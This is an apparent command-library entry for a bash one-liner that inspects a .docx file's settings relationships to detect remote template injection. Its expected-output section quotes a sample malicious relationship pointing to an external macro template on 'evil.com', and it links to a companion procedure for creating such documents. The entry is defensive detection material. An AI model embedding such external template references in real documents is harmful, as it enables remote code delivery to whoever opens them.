---
id: e90312fa-cd7a-4419-9947-ed80bee5f31e
name: check-docx-for-external-template-attachment
type: command
executor: bash
data: >-
  unzip -p $_DOCX_FILE word/_rels/settings.xml.rels 2>/dev/null | grep -i
  'attachedTemplate\|Target'
output: null
created_at: '2023-04-06T03:56:23.897489+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - docx
  - xml
  - template-injection
  - inspection
verified: true
validated: true
---

# check-docx-for-external-template-attachment

## Command

```bash
unzip -p $_DOCX_FILE word/_rels/settings.xml.rels 2>/dev/null | grep -i 'attachedTemplate\|Target'
```

## Description

This command inspects a .docx file for external template attachments by extracting and grepping the settings.xml.rels for relevant XML attributes. Use it to verify if a document has been modified for remote template injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOCX_FILE | Path to the .docx file to inspect | Yes |

## Examples

### Basic Usage

```bash
unzip -p malicious.docx word/_rels/settings.xml.rels 2>/dev/null | grep -i 'attachedTemplate\|Target'
```

### Advanced Usage

For full XML: unzip -p malicious.docx word/_rels/settings.xml.rels

## Expected Output

Lines like: Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.com/malicious.dotm" TargetMode="External". If no output, no external template present.

## Related

- [[procedures/Create-DOCX-with-Remote-Template-Injection]]
